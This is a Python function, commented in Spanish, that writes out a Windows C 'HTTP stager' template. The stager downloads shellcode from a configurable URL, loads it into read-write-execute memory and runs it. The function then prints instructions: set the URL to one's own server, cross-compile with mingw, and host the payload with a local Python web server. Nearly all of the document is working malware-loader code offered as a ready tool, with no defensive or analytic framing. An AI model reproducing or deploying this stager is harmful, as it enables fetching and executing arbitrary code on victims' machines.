def generate_stager():
    print("\n[+] Generando plantilla de Stager HTTP...\n")

    code = '''
// templates/stager_http.c
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

int main() {
    HINTERNET hInternet, hFile;
    DWORD bytesRead;
    char url[] = "http://127.0.0.1/shellcode.dat"; //  EDITAR

    BYTE buffer[4096];
    LPVOID exec;

    hInternet = InternetOpenA("NextGen", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return -1;

    hFile = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) return -2;

    // Reservar memoria RWX
    exec = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!exec) return -3;

    // Leer shellcode remoto y guardar en memoria
    InternetReadFile(hFile, exec, 4096, &bytesRead);
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    // Ejecutar shellcode
    ((void(*)())exec)();

    return 0;
}
'''

    with open("templates/stager_http.c", "w") as f:
        f.write(code.strip())

    print("[+] Archivo generado: templates/stager_http.c")
    print("[+]modifica linea 11, esta: char url[] = http://tuserver/tupayload.dat;")
    print("[+]compila: x86_64-w64-mingw32-gcc templates/stager_http.c -o stager.exe -lwininet -O2")
    print("[+]levanta tu server local: python3 -m http.server 80")
    

